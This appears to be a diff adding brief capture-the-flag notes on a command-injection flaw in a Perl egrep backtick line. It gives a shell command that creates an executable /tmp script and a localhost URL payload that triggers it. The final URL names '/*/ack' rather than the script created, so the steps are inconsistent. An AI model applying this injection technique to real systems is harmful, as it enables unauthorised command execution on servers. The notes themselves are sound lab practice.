@@ -1,0 +1,10 @@
+Pretty sure we need to exploit line 11 or 14
+"@output = `egrep "^$xx" /tmp/xd 2>&1`;"
+This line can be made to execute a payload
+"@output = `egrep "^`/*/SCRIPT`" /tmp/xd 2>&1`;"
+by making $xx=`/*/SCRIPT`
+`echo '#!/bin/bash
+getflag > /tmp/flag' > /tmp/SCRIPT && chmod 777 /tmp/SCRIPT`
+This creates a payload file to be executed by flag12
+This executes the payload:
+"http://localhost:4646/?x=`/*/ack`"
